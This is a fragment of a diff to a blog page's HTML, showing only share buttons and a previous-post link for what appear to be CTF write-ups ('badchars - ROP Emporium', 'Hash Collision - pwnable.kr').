+        <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=badchars%20-%20ROP%20Emporium&url=http://localhost:4000/2023/05/24/ROP-Emporium-badchars/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow"><i class="ion ion-logo-twitter"></i></a>
+
+        <a class="share__link share__pinterest" href="http://pinterest.com/pin/create/button/?url=http://localhost:4000/2023/05/24/ROP-Emporium-badchars/&amp;media=http://localhost:4000/media/posts_thumb/badchars.png&amp;description=badchars%20-%20ROP%20Emporium" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;" title="Share on Pinterest" rel="nofollow"><i class="ion ion-logo-pinterest"></i></a>
+      </div>
+    </div>
+
+    <div class="post__navigation">
+      
+      <a class="prev" href="/2023/03/12/Hash-Collision-pwnablekr/">
+        <img class="post__nav-image lazy" data-src="/media/posts_thumb/collision.png" alt="Hash Collision - pwnable.kr - решение">
+        <div class="post__nav-box">
+          <div class="post__nav post__nav__prev"><i class="ion ion-md-arrow-round-back"></i> Previous Post</div>
+          <h4 class="post__nav__title">Hash Collision - pwnable.kr - решение</h4>
+        </div>
+      </a>
+      
+      
+    </div>
+
   </article>
 </div>
-<!-- end page -->
+<!-- end post -->
+
+
+
+
   </main> 
   <!-- end content -->
   
